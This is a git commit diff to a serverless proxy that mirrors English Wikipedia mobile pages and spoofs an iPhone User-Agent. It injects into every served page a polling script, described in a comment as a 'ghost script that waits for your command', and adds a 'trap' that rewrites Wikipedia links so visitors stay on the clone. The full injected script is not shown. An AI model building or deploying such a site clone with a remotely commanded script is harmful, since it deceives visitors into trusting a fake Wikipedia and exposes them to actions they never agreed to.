f0a901675f7bfbf15c8552c928e89bdde88016fd
idontknowhowtocode21 <pprivatebrna43@gmail.com>
2026-04-02 06:50:13 +0530

    Update index.js

--- api/index.js
+++ api/index.js
@@ -12,15 +12,20 @@ export default async function handler(req, res) {
         return res.json({ active: forceActive });
     }
 
-    try {
-        // If the URL is just '/', we fetch the Main Page
+       try {
         const path = (url === '/' || url === '/api') ? '/wiki/Main_Page' : url;
         const targetUrl = `https://en.m.wikipedia.org${path}`;
         
-        const response = await axios.get(targetUrl);
+        // 1. THE SECRET SAUCE: Pretend to be an iPhone
+        const response = await axios.get(targetUrl, {
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1'
+            }
+        });
+        
         let html = response.data;
 
-        // INJECTION
+        // 2. THE INJECTION: The ghost script that waits for your command
         const injection = `
             <script>
                 setInterval(async () => {
@@ -36,9 +41,14 @@ export default async function handler(req, res) {
         `;
         
         html = html.replace('</head>', injection + '</head>');
+        
+        // 3. THE TRAP: Replace Wikipedia links so they stay on YOUR Vercel site
+        html = html.replace(/https:\/\/en.m.wikipedia.org/g, ''); 
+
         res.setHeader('Content-Type', 'text/html');
         return res.send(html);
     } catch (e) {
         return res.status(500).send("Proxy Error: " + e.message);
     }
+ 
 }
